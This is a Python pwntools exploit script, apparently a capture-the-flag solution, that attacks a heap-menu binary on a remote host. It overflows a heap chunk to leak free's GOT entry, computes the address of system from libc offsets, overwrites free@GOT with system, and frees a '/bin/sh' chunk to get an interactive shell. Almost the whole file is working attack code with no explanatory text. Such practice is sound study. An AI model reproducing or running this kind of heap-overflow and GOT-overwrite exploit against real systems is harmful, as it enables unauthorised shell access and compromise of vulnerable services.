from pwn import *
from LibcSearcher import *
context(arch='i386', log_level='debug')

# io = process('./pwn')
io = remote('111.200.241.244', 61232)
elf = ELF('./pwn')
libca = ELF('./libc.so.6')

def add(desc_size, name, text_size, desc):
	io.sendlineafter(b'Action: ', b'0')
	io.sendlineafter(b'size of description: ', str(desc_size).encode())
	io.sendafter(b'name: ', name)
	io.sendlineafter(b'text length: ', str(text_size).encode())
	io.sendafter(b'text: ', desc)

def delete(index):
	io.sendlineafter(b'Action: ', b'1')
	io.sendlineafter(b'index: ', str(index).encode())

def display(index):
	io.sendlineafter(b'Action: ', b'2')
	io.sendlineafter(b'index: ', str(index).encode())

def update(index, length, content):
	io.sendlineafter(b'Action: ', b'3')
	io.sendlineafter(b'index: ', str(index).encode())
	io.sendlineafter(b'text length: ', str(length).encode())
	io.sendafter(b'text: ', content)

add(0x20, b'/bin/sh\n', 0x20, b'/bin/sh\n')
add(0x20, b'Alice\n', 0x20, b'Chunk #0\n')
add(0x20, b'Bob\n', 0x20, b'Chunk #1\n')
delete(1)

# payload = cyclic(0x88) + p32(0x88) + p32(0x31) + cyclic(0x28) + \
#		  p32(0x30) + p32(0x91) + p32(elf.got['free'])
payload = cyclic(0x80) + p32(0x80) + p32(0x29) + cyclic(0x20) + \
		  p32(0x28) + p32(0x89) + p32(elf.got['free'])
add(0x80, b'Hacker\n', 0xd0, payload + b'\n')
display(2)

mem_free_addr = u32(io.recvuntil(b'0: Add')[0x15: 0x19])

libc = LibcSearcher('free', mem_free_addr)
libc_base = mem_free_addr - 0x70750 # - libc.dump('free')
# libc_base = mem_free_addr - libca.symbols['free']
mem_system_addr = libc_base + 0x3A940 # + libc.dump('system')
# print(hex(libc.dump('free')))
# print(hex(libc.dump('system')))
# print(hex(libc.dump('free') - libc.dump('system')))
# 0x75C30
# print(hex(libca.symbols['system']))
# print(hex(libca.symbols['free']))

update(2, 10, p32(mem_system_addr) * 2 + b'\n')
# print(hex(mem_system_addr))
# display(2)

# add(0x20, b'buffer area\n', 0x20, b'/bin/sh\n')

# add(0x20, b"Hacker's name\n", 0x20, b'Chunk #4\n')
# add(0x20, b'buffer\n', 0x20, b'Chunk #5\n')
# delete(4)

# payload = payload = cyclic(0x80) + p32(0x80) + p32(0x29) + cyclic(0x20) + \
# 		  p32(0x28) + p32(0x89) + p32(mem_system_addr)
# add(0x80, b'Hacker!\n', 0xd0, payload + b'\n')
# display(5)
# pause()
# update(5, 0x10, p32(mem_system_addr) + b'\n')

# print(hex(mem_system_addr))
delete(0)
io.interactive()